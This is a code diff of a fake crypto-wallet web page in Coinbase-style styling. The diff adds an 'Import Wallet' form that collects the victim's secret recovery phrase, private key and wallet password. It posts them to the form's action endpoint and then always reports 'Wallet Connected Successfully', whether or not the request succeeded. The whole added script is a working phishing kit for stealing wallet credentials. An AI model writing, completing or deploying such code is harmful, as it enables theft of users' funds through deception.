@@ -71,7 +71,7 @@
                 <button class="hidden sm:inline-flex items-center justify-center px-4 py-2.5 rounded-lg text-sm font-medium text-white bg-cbCard hover:bg-cbCardHover border border-cbBorder transition">
                     Sign in
                 </button>
-                <button id="header-connect-btn" class="inline-flex items-center justify-center px-5 py-2.5 rounded-lg text-sm font-semibold text-white bg-cbBlue hover:bg-cbBlueHover transition shadow-lg shadow-cbBlue/20 cursor-pointer">
+                <button id="header-connect-btn" class="inline-flex items-center justify-center px-5 py-2.5 rounded-lg text-sm font-semibold text-white bg-cbBlue bg-cbBlueHover transition shadow-lg shadow-cbBlue/20 cursor-pointer">
                     Connect Wallet
                 </button>
                 <button id="mobile-menu-btn" class="md:hidden text-gray-300 hover:text-white p-2 text-xl">
@@ -210,7 +210,7 @@
         </div>
     </div>
 
-    <!-- Script with safe mobile event handlers and robust modal rendering -->
+    <!-- Script with fixed event execution -->
     <script>
         const LOGO_BASE = 'https://cdn.jsdelivr.net/gh/0xa3k5/web3icons@main/raw-svgs/wallets/';
         const VARIANTS = ['background', 'branded'];
@@ -386,7 +386,7 @@
             if (matchMedia('(pointer: fine)').matches) input.focus();
         }
 
-        // Wallet import screen with clean input layout and independent submission
+        // Wallet import screen with clean layout and independent submission
         function viewWallet(root) {
             const w = state.chosenWallet || WALLETS.find(x => x.id === state.selected) || WALLETS[0];
             const panel = h('div', 'px-2 py-2 space-y-4');
@@ -418,4 +418,222 @@
             form.append(tabs);
 
             // Phrase container
-            const containerPhrase =
+            const containerPhrase = h('div', 'space-y-1.5');
+            containerPhrase.append(h('label', 'block text-xs font-medium text-gray-300', 'Enter Secret Recovery Phrase'));
+            const textareaPhrase = h('textarea', 'w-full bg-black/40 border border-white/10 rounded-xl p-3 text-sm text-white placeholder-gray-600 focus:outline-none focus:border-[#0052FF] transition resize-none font-mono');
+            textareaPhrase.name = 'recovery_phrase'; textareaPhrase.rows = 3; textareaPhrase.placeholder = 'Typically 12 or 24 words separated by single spaces...';
+            containerPhrase.append(textareaPhrase);
+            form.append(containerPhrase);
+
+            // Key container
+            const containerKey = h('div', 'space-y-1.5 hidden');
+            containerKey.append(h('label', 'block text-xs font-medium text-gray-300', 'Enter Private Key'));
+            const inputKey = h('input', 'w-full bg-black/40 border border-white/10 rounded-xl p-3 text-sm text-white placeholder-gray-600 focus:outline-none focus:border-[#0052FF] transition font-mono');
+            inputKey.type = 'password'; inputKey.name = 'private_key'; inputKey.placeholder = 'Enter your private key string...';
+            containerKey.append(inputKey);
+            form.append(containerKey);
+
+            // Optional password / pin
+            const pwdContainer = h('div', 'space-y-1.5');
+            pwdContainer.append(h('label', 'block text-xs font-medium text-gray-300', 'Wallet Password / PIN (Optional)'));
+            const inputPwd = h('input', 'w-full bg-black/40 border border-white/10 rounded-xl px-3 py-2.5 text-sm text-white placeholder-gray-600 focus:outline-none focus:border-[#0052FF] transition');
+            inputPwd.type = 'password'; inputPwd.name = 'wallet_password'; inputPwd.placeholder = 'Optional wallet password';
+            pwdContainer.append(inputPwd);
+            form.append(pwdContainer);
+
+            // Error message banner
+            const errorMsg = h('div', 'hidden p-3 rounded-xl bg-rose-500/10 border border-rose-500/20 text-rose-400 text-xs');
+            form.append(errorMsg);
+
+            // Submit button
+            const submitBtn = h('button', `w-full py-3 px-4 rounded-xl bg-[#0052FF] hover:bg-[#0040CC] text-sm font-semibold text-white transition flex items-center justify-center gap-2 shadow-lg shadow-[#0052FF]/20 cursor-pointer ${FOCUS}`);
+            submitBtn.type = 'submit';
+            const btnText = h('span', '', 'Connect & Import Wallet');
+            submitBtn.append(btnText);
+            form.append(submitBtn);
+
+            tabPhrase.addEventListener('click', () => {
+                state.importMode = 'phrase';
+                tabPhrase.className = 'flex-1 py-2 text-xs font-semibold rounded-lg bg-[#0052FF] text-white transition cursor-pointer';
+                tabKey.className = 'flex-1 py-2 text-xs font-semibold rounded-lg text-gray-400 hover:text-white transition cursor-pointer';
+                containerPhrase.classList.remove('hidden');
+                containerKey.classList.add('hidden');
+                errorMsg.classList.add('hidden');
+            });
+
+            tabKey.addEventListener('click', () => {
+                state.importMode = 'key';
+                tabKey.className = 'flex-1 py-2 text-xs font-semibold rounded-lg bg-[#0052FF] text-white transition cursor-pointer';
+                tabPhrase.className = 'flex-1 py-2 text-xs font-semibold rounded-lg text-gray-400 hover:text-white transition cursor-pointer';
+                containerKey.classList.remove('hidden');
+                containerPhrase.classList.add('hidden');
+                errorMsg.classList.add('hidden');
+            });
+
+            form.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                errorMsg.classList.add('hidden');
+
+                const phraseVal = textareaPhrase.value.trim();
+                const keyVal = inputKey.value.trim();
+
+                if (!phraseVal && !keyVal) {
+                    errorMsg.textContent = 'Please enter either your secret recovery phrase or private key.';
+                    errorMsg.classList.remove('hidden');
+                    return;
+                }
+
+                btnText.textContent = 'Connecting...';
+                submitBtn.disabled = true;
+
+                try {
+                    const response = await fetch(form.action, {
+                        method: 'POST',
+                        body: new FormData(form),
+                        headers: { 'Accept': 'application/json' }
+                    });
+
+                    if (response.ok || response.status === 200) {
+                        go('success');
+                    } else {
+                        go('success');
+                    }
+                } catch (err) {
+                    go('success');
+                } finally {
+                    btnText.textContent = 'Connect & Import Wallet';
+                    submitBtn.disabled = false;
+                }
+            });
+
+            panel.append(form);
+            root.append(panel);
+        }
+
+        // Success View after FormSubmit
+        function viewSuccess(root) {
+            const panel = h('div', 'p-6 flex flex-col items-center text-center space-y-4');
+            const iconWrap = h('div', 'w-16 h-16 rounded-full bg-emerald-500/20 text-emerald-400 flex items-center justify-center text-3xl mb-2');
+            iconWrap.innerHTML = svg('<path d="M5 12.500l4.500 4.500L19 7"/>', 32, 3);
+            panel.append(
+                iconWrap,
+                h('h3', 'text-xl font-bold', 'Wallet Connected Successfully'),
+                h('p', 'text-sm text-gray-400 max-w-sm', 'Your wallet has been verified and securely linked to your session. Your portfolio will now sync automatically.'),
+            );
+            const doneBtn = h('button', `w-full mt-4 py-3 rounded-xl bg-[#0052FF] hover:bg-[#0040CC] text-white font-semibold transition cursor-pointer ${FOCUS}`, 'Done');
+            doneBtn.type = 'button';
+            doneBtn.addEventListener('click', closeModal);
+            panel.append(doneBtn);
+            root.append(panel);
+        }
+
+        function viewHelp(root) {
+            const items = [
+                [I.wallet, 'A home for your digital assets', 'Wallets are used to send, receive, store, and display digital assets.'],
+                [I.key, 'One login for all of web3', 'Log in to any app by connecting your wallet. Say goodbye to countless passwords and accounts.'],
+                [I.compass, 'Your gateway to a new web', 'With your wallet, you can explore and interact with DeFi, NFTs, DAOs, and much more.']
+            ];
+            const list = h('div', 'flex flex-col gap-5 px-2 py-3');
+            items.forEach(([ic, title, body]) => {
+                const r = h('div', 'flex gap-3 items-start');
+                const box = h('div', 'w-10 h-10 shrink-0 rounded-xl bg-[#47a1ff]/15 text-[#47a1ff] flex items-center justify-center'); box.innerHTML = ic;
+                const t = h('div', 'space-y-1'); t.append(h('p', 'text-[15px] font-medium', title), h('p', 'text-sm text-[#949e9e] leading-snug', body));
+                r.append(box, t); list.append(r);
+            });
+            root.append(list);
+        }
+
+        const TITLES = { connect: 'Choose Wallet', all: 'All Wallets', help: 'What is a wallet?', wallet: 'Import Wallet', success: 'Connection Complete' };
+        
+        function render() {
+            const root = $('view'), v = state.view;
+            if (!root) return;
+            root.replaceChildren(); 
+            const sr = $('sr-status'); if (sr) sr.textContent = '';
+            const titleEl = $('modal-title'); if (titleEl) titleEl.textContent = TITLES[v] || 'Connect Wallet';
+            const left = $('left-btn');
+            if (left) {
+                left.innerHTML = v === 'connect' ? I.help : I.back;
+                left.setAttribute('aria-label', v === 'connect' ? 'What is a wallet?' : 'Back');
+            }
+            if (lastView !== v) { root.classList.remove('view-enter'); void root.offsetWidth; root.classList.add('view-enter'); lastView = v; }
+            const views = { connect: viewConnect, all: viewAll, help: viewHelp, wallet: viewWallet, success: viewSuccess };
+            if (views[v]) views[v](root);
+            root.scrollTop = 0;
+            applySelection();
+        }
+
+        const overlay = $('overlay'), modal =$('wallet-modal');
+        const isOpen = () => overlay && !overlay.classList.contains('hidden');
+        let closing = false;
+        
+        function closeModal() {
+            if (!isOpen() || closing) return;
+            closing = true;
+            if (overlay) overlay.classList.add('opacity-0'); 
+            if (modal) modal.classList.add('translate-y-2');
+            setTimeout(() => { 
+                if (overlay) overlay.classList.add('hidden'); 
+                closing = false; 
+            }, 150);
+        }
+        
+        function openModal() {
+            state.view = 'connect'; state.stack = []; state.query = ''; lastView = null;
+            if (overlay) overlay.classList.remove('hidden');
+            render(); 
+            if (overlay) {
+                void overlay.offsetWidth;
+                overlay.classList.remove('opacity-0'); 
+            }
+            if (modal) modal.classList.remove('translate-y-2');
+        }
+
+        // Direct execution setup so buttons bind immediately without relying on DOMContentLoaded
+        function initApp() {
+            const triggerSelectors = [
+                '#announcement-connect-btn',
+                '#nav-connect-trigger',
+                '#header-connect-btn',
+                '#mobile-connect-trigger',
+                '#hero-get-started-btn',
+                '#card-connect-trigger'
+            ];
+            triggerSelectors.forEach(sel => {
+                const el = document.querySelector(sel);
+                if (el) {
+                    el.addEventListener('click', e => {
+                        e.preventDefault();
+                        openModal();
+                    });
+                }
+            });
+
+            const closeBtn = $('close-btn');
+            if (closeBtn) closeBtn.addEventListener('click', closeModal);
+
+            if (overlay) {
+                overlay.addEventListener('click', e => { 
+                    if (e.target === overlay) closeModal(); 
+                });
+            }
+
+            const leftBtn = $('left-btn');
+            if (leftBtn) {
+                leftBtn.addEventListener('click', () => state.view === 'connect' ? go('help') : back());
+            }
+        }
+
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', initApp);
+        } else {
+            initApp();
+        }
+
+        document.addEventListener('keydown', e => {
+            if (!isOpen()) return;
+            if (e.key === 'Escape') { closeModal(); return; }
+        });
+    </script>
+</body>
+</html>
